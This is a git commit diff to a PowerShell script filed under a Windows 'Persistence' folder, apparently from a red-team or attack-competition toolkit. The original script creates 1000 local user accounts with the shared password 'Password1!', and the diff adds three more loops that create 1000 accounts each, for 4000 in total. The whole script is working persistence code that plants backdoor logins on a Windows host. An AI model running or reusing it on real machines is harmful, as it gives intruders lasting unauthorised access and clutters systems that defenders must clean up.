c908dd95e89bf1ccb5786b7228b8eb74c30dca23
megatop1 <43348736+megatop1@users.noreply.github.com>
2021-11-20 01:48:41 -0500

    Update CreateThousandUsers.ps1

--- Windows/Persistence/CreateThousandUsers.ps1
+++ Windows/Persistence/CreateThousandUsers.ps1
@@ -1,3 +1,15 @@
 for ($i = 0; $i -lt 1000; $i++) {
   New-LocalUser -Name "bob$i" -Password "Password1!" 
 }
+
+for ($i = 0; $i -lt 1000; $i++) {
+  New-LocalUser -Name "Donald Trump$i" -Password "Password1!" 
+}
+
+for ($i = 0; $i -lt 1000; $i++) {
+  New-LocalUser -Name "Ron Desantis$i" -Password "Password1!" 
+}
+
+for ($i = 0; $i -lt 1000; $i++) {
+  New-LocalUser -Name "Jarvis$i" -Password "Password1!" 
+}
